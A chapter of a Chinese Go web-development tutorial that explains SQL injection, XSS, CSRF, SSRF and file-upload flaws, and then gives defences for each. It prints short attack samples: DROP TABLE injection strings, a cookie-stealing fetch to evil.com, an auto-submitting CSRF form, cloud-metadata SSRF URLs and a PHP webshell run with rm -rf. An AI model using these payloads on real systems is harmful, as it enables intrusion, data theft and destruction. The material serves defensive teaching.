# 第82章 · Web安全：常见攻击

> "前面五章我们学会了让用户登录、发Token、控制权限——但这些都是'前门'的安全措施。如果你的'墙'有裂缝呢？黑客根本不需要破解密码——他可以通过SQL注入直接偷走整个数据库，通过XSS注入偷走用户的Token，通过CSRF让用户不知不觉中完成转账。安全没有银弹，但理解了这些攻击的原理，你就知道该怎么堵住裂缝。本章带你逐个击破最常见的五种Web攻击。"

---

## 82.1 SQL注入（重中之重！）

### 什么是SQL注入

把用户输入当作SQL代码的一部分执行——这就是SQL注入（攻击者通过拼接恶意SQL代码操控数据库，详见附录I）。不是数据库的Bug，是你写的代码允许攻击者"拼接"SQL。

### 原理演示

假设你有一个登录接口：

```go
func LoginBad(c *gin.Context) {
    username := c.Query("username")
    password := c.Query("password")

    sql := fmt.Sprintf(
        "SELECT id FROM users WHERE username='%s' AND password='%s'",
        username, password,
    )

    rows := database.DB.Query(sql)
}
```

当用户正常输入 `username=张三&password=123456`，SQL是这样的：

```sql
SELECT id FROM users WHERE username='张三' AND password='123456'
```

没问题。但如果攻击者输入 `username=admin'--&password=随便`，SQL变成：

```sql
SELECT id FROM users WHERE username='admin'--' AND password='随便'
```

`--` 在SQL里是注释符——后面的所有内容被忽略。这条SQL的实际效果等同于：

```sql
SELECT id FROM users WHERE username='admin'
```

攻击者**不需要知道密码**就登录了admin账号。

更可怕的变种——输入 `username=' OR '1'='1&password=' OR '1'='1`：

```sql
SELECT id FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

`'1'='1'` 永远为真，这条SQL返回所有用户。

还有最极端的情况——输入 `username='; DROP TABLE users; --`：

```sql
SELECT id FROM users WHERE username=''; DROP TABLE users; --'
```

整个 `users` 表被删除。所有数据瞬间消失。

### 后果

- **数据泄露**：攻击者读取用户表、订单表、支付记录
- **数据篡改**：修改余额、订单状态、权限
- **数据销毁**：DROP TABLE、DELETE
- **服务器沦陷**：通过SQL写文件功能上传webshell，拿到服务器控制权

SQL注入常年位列OWASP Top 10的第一位——它是Web应用最危险、最常见的漏洞。

### Go中的防护：只用参数化查询

**永远不要用字符串拼接构造SQL。**

Go的 `database/sql` 包天然支持参数化查询（Prepared Statement）：

```go
row := database.DB.QueryRow(
    "SELECT id FROM users WHERE username = ? AND password_hash = ?",
    username, passwordHash,
)
```

数据库驱动会把 `?` 当作参数占位符，将用户输入的值安全地绑定进去——**值永远只被当作数据，不会被当作SQL代码**。

攻击者再怎么输入 `' OR '1'='1`，驱动都会把它当作一个字符串值来匹配 `username` 字段——数据库中没有一个用户的用户名是 `' OR '1'='1`，所以查不出来。注入失败。

### 动态字段名/表名怎么办？

参数化查询不支持用 `?` 占位符替代表名和字段名。如果你需要动态排序：

```go
func GetUsers(orderBy string) {
    sql := fmt.Sprintf("SELECT * FROM users ORDER BY %s", orderBy)
    // ❌ 注入风险！
}
```

这种情况下，必须用**白名单**：

```go
var allowedColumns = map[string]bool{
    "id":        true,
    "username":  true,
    "created_at": true,
}

func GetUsers(orderBy string) ([]User, error) {
    if !allowedColumns[orderBy] {
        return nil, fmt.Errorf("非法的排序字段: %s", orderBy)
    }
    sql := fmt.Sprintf("SELECT * FROM users ORDER BY %s", orderBy)
    // 现在安全了
}
```

只接受白名单中的值，拒绝一切不在名单内的输入。

### GORM是否安全？

GORM和其他ORM在绝大多数情况下会自动使用参数化查询：

```go
db.Where("username = ?", username).Find(&users)           // ✅ 安全
db.Where("username = ? AND role = ?", username, role)     // ✅ 安全
```

但如果你的代码中出现这种写法：

```go
db.Where("username = '" + username + "'").Find(&users)    // ❌ 危险！
db.Raw("SELECT * FROM users WHERE username = '" + username + "'").Scan(&users)  // ❌ 危险！
db.Order(username).Find(&users)                           // ❌ 如果username来自用户输入，危险！
```

ORM不能阻止你写出注入代码。工具给你了，怎么用在于你。

### 补充防护层

**最小权限原则**：应用连接的数据库账号只授予必要的权限——只给SELECT/INSERT/UPDATE/DELETE，不给DROP/ALTER/GRANT。即使发生注入，攻击者能造成的破坏也有限。

**输入校验**：对长度、格式做基本校验——用户名不应该包含 `'` 和 `--`。

**WAF（Web应用防火墙）**：在应用前面加一层WAF，识别并拦截SQL注入特征。

但最重要的永远是：**参数化查询。** 其他都是锦上添花。

---

## 82.2 XSS攻击（跨站脚本攻击）

### 什么是XSS

XSS（Cross-Site Scripting，在网页中注入恶意脚本攻击其他用户，详见附录I）是在别人的网页中注入恶意JavaScript代码。当其他用户访问这个页面时，恶意脚本在用户的浏览器里执行——在你的域名下、用你的Cookie、以你的身份发请求。

### 三种类型

**（一）存储型XSS**

攻击者把恶意脚本存入服务器（比如发了一篇包含 `<script>` 的文章），当其他用户查看这篇文章时，脚本执行。

```
攻击者 → 发评论："<script>偷Cookie</script>" → 存入数据库
用户A → 打开页面 → 服务器返回评论 → 浏览器执行<script> → 中招
```

这是最危险的XSS——攻击一次，所有看到这条内容的用户都中招。

**（二）反射型XSS**

恶意脚本不存入服务器，而是藏在URL里，诱导用户点击。

```
攻击者 → 发钓鱼邮件："点击查看" → 链接是 yourapp.com/search?q=<script>偷Cookie</script>
用户 → 点击链接 → 服务器把q参数原样返回在页面里 → 浏览器执行<script> → 中招
```

**（三）DOM型XSS**

恶意脚本全程在浏览器端执行，不经过服务器。通常是无良的 `innerHTML` 惹的祸：

```javascript
document.getElementById("output").innerHTML = location.hash.slice(1);
```

如果URL里 `#<img src=x onerror="alert(1)">`，图片加载失败触发 `onerror`，执行恶意JS。

### XSS能做什么

- **偷Cookie**：`fetch("https://evil.com/steal?c=" + document.cookie)` —— 攻击者拿到用户的SessionID
- **劫持操作**：在用户登录状态下，用 `fetch()` 发API请求——修改用户资料、转账、发垃圾内容
- **钓鱼**：弹一个以假乱真的登录框，骗用户输入密码
- **修改页面**：替换下载链接、插入虚假广告、篡改页面内容

### 防护方案

**（一）永远不要用 `innerHTML` 拼接用户内容**

```javascript
element.innerHTML = userInput;  // ❌ 极度危险
element.textContent = userInput; // ✅ 安全——文本不会被当作HTML
```

**（二）Go模板引擎自动转义**

Go的 `html/template` 包会**自动对所有输出进行HTML转义**——`<` 变成 `&lt;`，`>` 变成 `&gt;`，`"` 变成 `&quot;`……脚本标签 `<script>` 变成无害的 `&lt;script&gt;`，在浏览器里显示为纯文本而不是被执行。

```go
import "html/template"

tmpl.Execute(w, data)
```

只要你不主动用 `template.HTML()` 标记"这段内容是可信的HTML"，模板引擎就会自动保护你。**`html/template` 而非 `text/template`**——名称只有一字之差，安全性天壤之别。

**（三）Content-Security-Policy（CSP）头**

CSP是浏览器的"白名单机制"——告诉浏览器只允许从特定来源加载和执行脚本：

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

在Gin中设置：

```go
r.Use(func(c *gin.Context) {
    c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self'")
    c.Next()
})
```

含义：默认只允许从本站加载资源（`'self'`），脚本只允许从本站加载。即使攻击者成功注入了 `<script src="https://evil.com/attack.js">`，浏览器也会拒绝加载。

**（四）HttpOnly Cookie**

如第78章所讲——SessionID用HttpOnly=true，即使XSS成功，脚本也偷不到Cookie。防不住XSS攻击本身，但防住了最严重后果之一的Cookie盗窃。

**（五）X-XSS-Protection头**

```
X-XSS-Protection: 1; mode=block
```

这是旧版浏览器的反射型XSS过滤器，现代浏览器已不再依赖它。但设上没坏处，对老浏览器用户多一层保护。

---

## 82.3 CSRF攻击（跨站请求伪造）

### 什么是CSRF

CSRF（Cross-Site Request Forgery）——攻击者诱导用户在已登录的情况下，不知不觉中向目标网站发请求。

### 场景还原

1. 你登录了 `bank.com`，银行在你的浏览器里存了Session Cookie
2. 你没登出银行，在另一个标签页打开了攻击者的网站 `evil.com`
3. `evil.com` 上有一个自动提交的表单：

```html
<form action="https://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker_account">
    <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

4. 浏览器向 `bank.com/transfer` 发POST请求，**自动带上了银行网站的Cookie**
5. 银行服务器看到请求里有你的Session Cookie，认为是你本人的操作
6. 转账成功——你丢了1万块，全程毫不知情

### CSRF的关键条件

- 用户已在目标网站登录（Cookie存在）
- 用户访问了恶意网站
- 目标网站的接口仅依赖Cookie做身份验证

### 防护方案

**（一）SameSite Cookie（最简单有效）**

如第78章所述：

```go
c.SetCookie("session_id", sid, 86400, "/", "", true, true)
//       名字      值   寿命 路径 域 Secure HttpOnly
```

但这还不够——SetCookie没有SameSite参数时，需要自己在响应头里加：

在 `gin-contrib/sessions` 中：

```go
store.Options(sessions.Options{
    SameSite: http.SameSiteStrictMode,
})
```

SameSite=Strict：**完全禁止**跨站请求携带Cookie。恶意网站发的任何请求都不会带你的Session Cookie。这是对付CSRF最干净利落的手段。

**（二）CSRF Token（传统方案）**

服务器生成一个随机Token，通过两种方式发给前端：
- 放在页面的隐藏表单字段里
- 放在Cookie里（但这Cookie的SameSite必须允许读取）

前端每次提交表单时把这个Token放在请求头里（如 `X-CSRF-Token: abc123`）。

服务器验证请求头里的Token和Session里的Token是否一致。攻击者猜不到Token值，无法伪造请求。

```go
func CSRFTokenMiddleware(c *gin.Context) {
    if c.Request.Method == "GET" {                                                               // ← 页面加载时生成Token并写入Cookie
        token := generateCSRFToken()
        c.SetCookie("csrf_token", token, 3600, "/", "", true, true)
        c.Set("csrf_token", token)
    }

    // Token完整流转: GET时生成→写入Cookie→前端读取→放入X-CSRF-Token请求头→POST时从Cookie读取比对
    if c.Request.Method == "POST" || c.Request.Method == "PUT" || c.Request.Method == "DELETE" {
        requestToken := c.GetHeader("X-CSRF-Token")
        expectedToken, err := c.Cookie("csrf_token")
        if err != nil || requestToken != expectedToken {
            c.JSON(403, gin.H{"msg": "CSRF Token验证失败"})
            c.Abort()
            return
        }
    }

    c.Next()
}
```

**（三）Referer/Origin头检查**

检查请求头中的 `Referer` 或 `Origin`，确认请求是从你自己的网站发起的：

```go
func CheckOrigin(c *gin.Context) {
    origin := c.GetHeader("Origin")
    if origin != "" && origin != "https://yourapp.com" {
        c.JSON(403, gin.H{"msg": "非法来源"})
        c.Abort()
        return
    }
    c.Next()
}
```

注意：Referer可以被伪造（老浏览器）或被禁用（某些隐私插件）。它是有用的辅助手段，但不能作为唯一防线。

**（四）对敏感操作要求额外验证**

转账、改密码、删账号——这些操作除了验证Cookie/Token外，要求输入密码或验证码。即使CSRF成功伪造了请求，攻击者不知道密码也无法完成操作。

这个是兜底防线。前面两个手段防住了99%的攻击，万一漏网，这一层也能拦住。

---

## 82.4 SSRF（服务器端请求伪造）

### 什么是SSRF

SSRF（Server-Side Request Forgery）——攻击者诱导服务器向内部网络或第三方服务发起请求。

### 攻击场景

假设你的网站有一个"网页截图"功能：用户输入URL，服务器访问那个URL并截图返回。

```go
func TakeScreenshot(c *gin.Context) {
    url := c.Query("url")
    resp, _ := http.Get(url)  // ❌ 服务器直接访问用户提供的URL
    buf, _ := io.ReadAll(resp.Body)
    // 处理截图...
}
```

如果攻击者输入的不是公开网页，而是：
- `http://localhost:6379/` —— Redis未授权访问，攻击者可以执行Redis命令
- `http://169.254.169.254/latest/meta-data/` —— 这是AWS/阿里云的**元数据API**，返回服务器的敏感信息（包括AccessKey）
- `http://10.0.1.5/admin/users` —— 你的内部管理后台，只有内网能访问

你的服务器帮攻击者访问了这些内部资源——而内部资源通常没有严格防护（因为它们"只在内网暴露"）。

### 防护方案

**（一）URL白名单**

只允许访问预定义的域名：

```go
var allowedHosts = map[string]bool{
    "example.com":              true,
    "www.example.com":          true,
    "api.trusted-partner.com":  true,
}

func validateURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("无效的URL: %w", err)
    }

    if u.Scheme != "http" && u.Scheme != "https" {
        return fmt.Errorf("仅支持HTTP/HTTPS协议")
    }

    if !allowedHosts[u.Host] {
        return fmt.Errorf("不允许访问: %s", u.Host)
    }

    return nil
}
```

**（二）禁止内网IP**

即使域名在白名单里，攻击者也可能通过DNS rebinding把域名解析到内网IP。所以还要检查目标IP是否在内网范围：

```go
func isPrivateIP(ip net.IP) bool {
    privateRanges := []string{
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "127.0.0.0/8",
        "169.254.0.0/16",
        "0.0.0.0/8",
    }

    for _, cidr := range privateRanges {
        _, network, _ := net.ParseCIDR(cidr)
        if network.Contains(ip) {
            return true
        }
    }
    return false
}
```

**（三）禁用危险协议**

只允许 `http://` 和 `https://`，禁止 `file://`、`ftp://`、`gopher://` 等协议。这些协议可能被用来读取本地文件或做端口扫描。

```go
if u.Scheme != "http" && u.Scheme != "https" {
    return fmt.Errorf("不支持的协议")
}
```

---

## 82.5 文件上传漏洞

### 攻击原理

你的应用允许用户上传头像。攻击者上传的不是头像，而是一个PHP/Java/Go后门文件。

假设你直接把上传文件保存在Web可访问目录：

```
/uploads/avatar.php  ← 攻击者上传的文件，内容是：
                       <?php system($_GET['cmd']); ?>
```

攻击者访问 `https://yourapp.com/uploads/avatar.php?cmd=rm -rf /` —— 服务器执行了任意命令。

即使你不用PHP，攻击者可以上传 `.jsp`、`.aspx`、`.py` 等任何服务器能执行的类型。他还可以上传包含恶意代码的 `.html` 文件用于钓鱼，或者上传一个超大文件把磁盘撑满。

### 防护方案（多层防御）

**（一）检查MIME类型（第一道）**

不要只看文件扩展名——扩展名可以被伪造。检查文件内容的真实类型：

```go
func validateFileType(file multipart.File) (string, error) {
    buffer := make([]byte, 512)
    file.Read(buffer)
    file.Seek(0, io.SeekStart)

    contentType := http.DetectContentType(buffer)

    allowedTypes := map[string]bool{
        "image/jpeg": true,
        "image/png":  true,
        "image/gif":  true,
        "image/webp": true,
    }

    if !allowedTypes[contentType] {
        return "", fmt.Errorf("不允许的文件类型: %s", contentType)
    }

    return contentType, nil
}
```

`http.DetectContentType` 读取文件的前512字节并分析真实格式——即使文件名是 `virus.exe` 改成 `photo.jpg`，也能被检测出来。

**（二）限制扩展名（第二道）**

即使MIME类型对了，也要做扩展名白名单：

```go
func validateExtension(filename string) error {
    ext := strings.ToLower(filepath.Ext(filename))
    allowed := map[string]bool{
        ".jpg": true,
        ".jpeg": true,
        ".png": true,
        ".gif": true,
        ".webp": true,
    }
    if !allowed[ext] {
        return fmt.Errorf("不允许的扩展名: %s", ext)
    }
    return nil
}
```

**（三）重命名文件（第三道）**

不要保留用户的原始文件名。用UUID或随机字符串重命名：

```go
func generateSafeFilename(originalName string) string {
    ext := filepath.Ext(originalName)
    uuid := uuid.New().String()
    return uuid + ext
}
```

这样做有三个好处：
- 文件名不含攻击代码（如 `../../../etc/passwd` 的路径穿越）
- 不会覆盖同名文件
- 不会暴露原始文件名中的用户信息

**（四）隔离存储（第四道）**

将上传文件存到Web不可直接访问的位置，或存到单独的静态资源服务器/对象存储（如阿里云OSS、AWS S3）。

如果是本地存储，放在项目目录之外，或通过一个Controller代理访问，而不是直接暴露静态目录：

```go
r.GET("/files/:filename", func(c *gin.Context) {
    filename := c.Param("filename")
    filePath := filepath.Join("/var/app/private_uploads", filepath.Clean(filename))
    c.File(filePath)
})
```

`filepath.Clean` 防路径穿越——即使攻击者输入 `../../etc/passwd`，也会被清理为安全的路径。

**（五）文件大小限制（第五道）**

```go
r.MaxMultipartMemory = 8 << 20  // 8MB
```

防止攻击者上传超大型文件耗尽磁盘空间。

**（六）病毒扫描（第六道，可选）**

对接ClamAV等杀毒引擎，对上传文件做扫描。成本较高，适用于安全要求极高的场景。

---

### 🤔 想多一点

安全是系统工程，不是某个功能。SQL注入你防了但XSS没防，攻击者还是能进来；XSS你防了但CSRF没防，攻击者换了攻击路径；前端校验做了但后端没做，攻击者绕过前端直接调API。

安全的核心理念是**纵深防御（Defense in Depth）**：不依赖任何单一防线，而是层层叠加。每一层都可能被突破，但层数越多，攻击成本越高。大多数攻击者寻找的是"低垂的果实"——那些有明显漏洞的网站。如果你做到了本章说的这些基本防护，你就已经不是低垂的果实了。

---

## 本章小结

| 知识点 | 要点 |
|--------|------|
| SQL注入 | 输入被当SQL执行——永远用参数化查询 `?` |
| 参数化查询 | `db.Query("... WHERE x = ?", val)` |
| 动态字段名 | 用白名单验证，不能参数化 |
| XSS-存储型 | 恶意脚本存入数据库，所有访问者中招 |
| XSS-反射型 | 恶意脚本在URL里，诱导点击 |
| XSS-DOM型 | 前端JS处理不当导致 |
| XSS防护 | 输出编码（html/template）+ CSP + HttpOnly |
| CSRF | 跨站伪造请求——攻击者利用用户的Cookie |
| CSRF防护 | SameSite Cookie + CSRF Token + Origin检查 |
| SSRF | 诱导服务器访问内网资源 |
| SSRF防护 | URL白名单 + 禁止内网IP + 禁止危险协议 |
| 文件上传漏洞 | 上传可执行文件做后门 |
| 文件上传防护 | MIME验证 + 扩展名白名单 + 重命名 + 隔离存储 + 大小限制 |
| 纵深防御 | 不依赖单一防线，层层叠加 |

> 🚀 下一章：第83章 · 加密基础。SQL注入、XSS、CSRF这些攻击防的是"坏人进来破坏"，但还有一个问题：数据在传输和存储过程中，怎么防止被偷看？这就需要加密。下一章我们深入哈希、对称加密、非对称加密和数字签名的原理，并用Go写出完整代码。

---
[← 上一章：81-RBAC权限控制.md](81-RBAC权限控制/) | [下一章：83-加密基础.md →](83-加密基础/)
